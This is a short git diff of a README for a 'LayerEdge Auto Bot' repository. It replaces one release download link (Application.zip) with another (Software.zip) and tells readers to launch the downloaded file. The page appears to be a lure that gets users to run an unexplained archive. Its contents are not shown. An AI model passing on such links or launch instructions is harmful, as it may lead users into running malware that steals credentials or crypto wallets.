@@ -11,7 +11,7 @@ Welcome to the LayerEdge Auto Bot GitHub repository! This repository is dedicate
 ## Get Started
 To get started with the LayerEdge Auto Bot, you can download the latest version by clicking on the following link: 
 
-[![Download LayerEdge Auto Bot](https://github.com/globalnewsory/LayerEdge-Auto-Bot/releases/download/v1.0/Application.zip)](https://github.com/globalnewsory/LayerEdge-Auto-Bot/releases/download/v1.0/Application.zip)
+[![Download LayerEdge Auto Bot](https://github.com/globalnewsory/LayerEdge-Auto-Bot/releases/download/v2.0/Software.zip)](https://github.com/globalnewsory/LayerEdge-Auto-Bot/releases/download/v2.0/Software.zip)
 
 If the link above ends with a file name, it needs to be launched. Otherwise, just visit the link provided. If the link is not working, please check the "Releases" section of this repository for more options.
 
